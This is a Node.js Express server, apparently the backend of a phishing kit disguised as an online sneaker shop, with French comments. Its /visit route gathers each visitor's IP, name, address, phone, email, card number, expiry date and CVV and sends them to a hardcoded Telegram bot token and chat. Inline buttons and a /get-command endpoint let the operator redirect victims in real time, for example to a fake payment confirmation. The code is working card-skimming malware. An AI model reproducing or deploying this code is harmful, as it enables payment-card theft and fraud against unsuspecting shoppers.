const express = require("express");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "web")));

const BOT_TOKEN = "8208574276:AAF96EdGjUrQqkRrb31QjzqVJ9uMB5c";
const CHAT_ID = "7747778364";
const BASE_URL = "https://basketnew.onrender.com";

let userCommands = {}; // stocke commandes pour chaque visitorId

// Envoi message Telegram
async function sendTelegramMessage(text, keyboard = null) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }),
  });
}

// Route visite ou formulaire
app.post("/visit", async (req, res) => {
  const { visitorId, page, formData } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  let message = `👤 <b>Utilisateur ID:</b> ${visitorId}\n🌍 <b>IP:</b> ${ip}\n📄 <b>Page:</b> ${page}`;

  // Si formulaire rempli
  if (formData) {
    message += `\n\n👤 <b>Nom:</b> ${formData.nom || "-"}`
             + `\n🏠 <b>Adresse:</b> ${formData.adresse || "-"}`
             + `\n📞 <b>Téléphone:</b> ${formData.telephone || "-"}`
             + `\n📧 <b>Email:</b> ${formData.email || "-"}`
             + `\n🛒 <b>Paire choisie:</b> ${formData.pair || "-"}`
             + `\n💳 <b>Carte:</b> ${formData.carte || "-"}`
             + `\n📅 <b>Expiration:</b> ${formData.expiration || "-"}`
             + `\n🔑 <b>CVV:</b> ${formData.cvv || "-"}`;
  }

  const keyboard = {
    inline_keyboard: [[
      { text: "🏠 Accueil", callback_data: `index_${visitorId}` },
      { text: "ℹ️ Info", callback_data: `info_${visitorId}` },
      { text: "📞 Contact", callback_data: `contact_${visitorId}` },
      { text: "👀 Visite", callback_data: `visite_${visitorId}` },
      { text: "✅ Confirmer Paiement", callback_data: `confirm_payment_${visitorId}` },
      { text: "↩️ Retour Accueil", callback_data: `return_home_${visitorId}` }
    ]]
  };

  await sendTelegramMessage(message, keyboard);
  res.json({ success: true });
});

// Récupérer commande pour visitorId
app.get("/get-command", (req, res) => {
  const { visitorId } = req.query;
  const command = userCommands[visitorId] || null;
  if (command) delete userCommands[visitorId];
  res.json({ command });
});

// Webhook Telegram pour boutons inline
app.post("/webhook", async (req, res) => {
  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [page, visitorId] = cb.data.split("_");
  userCommands[visitorId] = page;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id: cb.id, text: `➡️ Page: ${page}` }),
  });

  res.sendStatus(200);
});

// Port
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`✅ Serveur actif sur le port ${PORT}`);
  // Enregistrement automatique du webhook
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${BASE_URL}/webhook`);
  console.log("📡 Webhook Telegram configuré !");
});
